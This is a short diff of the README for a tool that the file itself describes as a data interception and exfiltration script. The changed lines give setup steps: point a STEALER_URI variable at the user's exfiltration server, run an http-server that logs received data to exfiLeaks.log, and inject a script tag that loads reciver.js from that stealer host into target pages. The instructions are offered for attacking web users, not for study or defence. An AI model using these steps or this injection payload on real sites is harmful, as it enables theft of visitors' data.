@@ -27,14 +27,14 @@ Overall, this script acts as a data interception and exfiltration tool, capturin
 
 ### CREATE WEB SERVER
 
-```Edit the var "let STEALER_URI = '';" to your exfiltrationi server URI.```
+Edit the var **"let STEALER_URI = '';"** to your exfiltrationi server URI.
 
 #### Prepare server:
 [https://www.npmjs.com/package/http-server](https://www.npmjs.com/package/http-server)
 
 ```sudo http-server --port 8080 -a 0.0.0.0 -d -i --cors > exfiLeaks.log```
 
-**Inject:** <script src="http://STEALER_URI:8080/reciver.js"></script>
+Inject: **<script src="http://STEALER_URI:8080/reciver.js"></script>**
 
 ### JSREVICER ONELINERS:
 
